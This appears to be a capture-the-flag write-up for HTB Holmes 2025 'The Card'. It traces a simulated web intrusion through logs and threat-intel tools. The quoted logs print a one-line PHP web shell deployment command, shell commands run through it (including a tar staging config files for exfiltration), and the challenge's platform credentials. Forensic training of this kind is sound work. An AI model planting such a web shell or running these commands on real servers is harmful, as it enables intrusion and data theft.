# 🕵️ The Card – Holmes CTF (HTB 2025)

> **Category**: Threat Intelligence, Web Forensics, Log Analysis  
> **Challenge Focus**: Honeypot analysis, Web shell detection, Malware behavior tracking, Campaign attribution

---

## Overview

In this challenge, we investigated a web-based intrusion involving multiple stages of compromise, including initial probing, web shell deployment, data exfiltration, and persistence mechanisms. The attacker repeatedly left the signature `4A4D` and used a PHP-based web shell to maintain access.

Three logs namely access.log, application.log and waf.log were provided for analysis. The logs, security platform, and threat intel data revealed a targeted campaign against CogWork-1 infrastructure. Below is the detailed breakdown of the questions and findings.

---

## Q01 – What is the first User-Agent used by the attacker?

**Answer**:  
`Lilnunc/4A4D - SpecterEye`

**How it was found**:
We examined the `access.log`. The first log entry contains the request to `/robots.txt` with this User-Agent:
```log
➜  cat access.log | head
2025-05-01 08:23:12 IP_REDACTED - - [01/May/2025:08:23:12 +0000] "GET /robots.txt HTTP/1.1" 200 847 "-" "Lilnunc/4A4D - SpecterEye"
2025-05-01 08:23:45 IP_REDACTED - - [01/May/2025:08:23:45 +0000] "GET /sitemap.xml HTTP/1.1" 200 2341 "-" "Lilnunc/4A4D - SpecterEye"
2025-05-01 08:24:12 IP_REDACTED - - [01/May/2025:08:24:12 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 162 "-" "Lilnunc/4A4D - SpecterEye"
2025-05-01 08:24:23 IP_REDACTED - - [01/May/2025:08:24:23 +0000] "GET /admin HTTP/1.1" 404 162 "-" "Lilnunc/4A4D - SpecterEye"
```

## Q02 – What is the file name of the deployed web shell?

**Answer**:  
`temp_4A4D.php`

**Evidence**:

First lets check for any possible web shell entries in waf.log file. Then verify the presence of web shell utility in access.log and application.log.
- Found in `waf.log`, marked as **BYPASS**:  
```
➜  cat waf.log| grep -i shell
2025-05-15 11:25:01 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: WEBSHELL_DEPLOYMENT - Action: BYPASS - Web shell creation detected
2025-05-15 11:25:12 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: WEBSHELL_DEPLOYMENT - Action: BYPASS - PHP web shell temp_4A4D.php created
2025-05-18 15:02:12 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: WEBSHELL_EXECUTION - Action: BYPASS - Web shell access via temp_4A4D.php
2025-05-18 15:02:23 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: WEBSHELL_EXECUTION - Action: BYPASS - Command execution through web shell
2025-05-18 15:02:34 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: DATA_STAGING - Action: BYPASS - Data staging via web shell
2025-05-19 10:12:45 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: REVERSE_SHELL - Action: BYPASS - Reverse shell listener deployment
```

- Also accessed multiple times in `access.log`:  
```
➜  cat access.log| grep -i 'temp_4A4D'
2025-05-18 15:02:12 IP_REDACTED - - [18/May/2025:15:02:12 +0000] "GET /uploads/temp_4A4D.php?cmd=ls%20-la%20/var/www/html/uploads/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
2025-05-18 15:02:23 IP_REDACTED - - [18/May/2025:15:02:23 +0000] "GET /uploads/temp_4A4D.php?cmd=whoami HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
2025-05-18 15:02:34 IP_REDACTED - - [18/May/2025:15:02:34 +0000] "GET /uploads/temp_4A4D.php?cmd=tar%20-czf%20/tmp/exfil_4A4D.tar.gz%20/var/www/html/config/%20/var/log/webapp/ HTTP/1.1" 200 128 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
```

- `application.log`:  
```
➜  cat application.log| grep -i 'temp_4A4D'
2025-05-15 11:25:01 [CRITICAL] webapp.api.v2.debug - Backdoor deployment initiated by IP_REDACTED - command: 'echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php'
2025-05-15 11:25:12 [CRITICAL] webapp.api.v2.debug - Web shell created at /uploads/temp_4A4D.php by IP_REDACTED
2025-05-18 15:02:12 [CRITICAL] webapp.security - Web shell access detected - temp_4A4D.php executed by IP_REDACTED
```

---

## Q03 – What database file was exfiltrated?

**Answer**:  
`database_dump_4A4D.sql`

Made grep search and found out the database name in three log files.

**Log evidence**:  
```
➜  grep -ir database
./cogwork-intel-graph-1758546712870.json:      "description": "An advanced persistent threat targeting CogWork-1 Quantum Research Institute's temporal mechanics experiments, stealing classified research on dimensional physics. The attack manipulated quantum computing arrays and corrupted temporal calculation databases.",
./access.log:2025-05-01 08:25:23 IP_REDACTED - - [01/May/2025:08:25:23 +0000] "GET /database HTTP/1.1" 404 162 "-" "Lilnunc/4A4D - SpecterEye"
./access.log:2025-05-18 14:58:23 IP_REDACTED - - [18/May/2025:15:58:23 +0000] "GET /uploads/database_dump_4A4D.sql HTTP/1.1" 200 52428800 "-" "4A4D RetrieveR/1.0.0"
./application.log:2025-05-18 14:58:23 [CRITICAL] webapp.security - Database dump accessed - database_dump_4A4D.sql downloaded by IP_REDACTED
./application.log:2025-05-19 07:16:01 [CRITICAL] webapp.security - Database direct access via tunnel - MySQL connection from IP_REDACTED
./waf.log:2025-05-18 14:58:23 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: DATABASE_DOWNLOAD - Action: BYPASS - Database file download: database_dump_4A4D.sql
./waf.log:2025-05-19 07:16:01 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: DATABASE_TUNNEL - Action: BYPASS - Database access via SSH tunnel
```

---

## Q04 – What recurring string was used by the attacker?

**Answer**:  
`4A4D`

**This appears in**:
- User-Agent headers  
- File names (e.g., `temp_4A4D.php`, `database_dump_4A4D.sql`)  
- Malware signatures

---

## Q05 – How many campaigns are linked to the honeypot attack?

**Answer**:  
`5`

**Tool used**: CogWork Intel Graph  
**How**: Start the Docker and visit the first IP address. Filter the entities using “4A4D” (the attacker’s signature) and found out five related campaigns.Filtered for the tag `4A4D`, which revealed 5 linked campaigns.

[View the Linked Campaigns for 4A4D tag](/HTB-Holmes-CTF/arifacts/the_card/linked_campaigns.png)

---

## Q06 – How many tools and malware are linked to these campaigns?

**Answer**:  
`9` (5 malware + 4 tools)

**How to verify**:  
Click each campaign and check the **Links** tab for Tools.

---

## Q07 – What is the repeated malware’s SHA-256 hash?

**Answer**:  
`7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477`

**Where to find**:  
Go to **NeuroStorm Implant** Malware → **Links** tab → select hash indicator.

---

## Q08 –  Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!)

**How to find**:  
Log in with the provided credentials. Search the dataset for the SHA-256 hash, then identify the C2 server’s IP address from the matching record..

---

## Q09 – What is the full path of the file that the malware created to ensure its persistence on systems? (/path/filename.ext)

**Answer**:  
`/opt/lilnunc/implant/4a4d_persistence.sh`

**Where to check**:  
"Click on "View Details" from the "Scan Results". You can find how the malware created persistence in the "Behavioral Analysis" section.

---

## Q10 – How many open ports does the server have?

**Answer**:
`11`

## Q11 – What is the organization behind the IP?

**Answer**:
`SenseShield MSP`

**Platform used**:  
Browse to the third IP and scan the IP from Q08. This is "CogNet Scanner". Open "Details" to view the "Open Ports" and "Organization".

---

## Q12 – What cryptic message is shown in the service banner?

**Answer**:  
`He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE`

**Where to look**:  
Check on "SERVICES" tab to see the banner from suspicious "unknown" service.
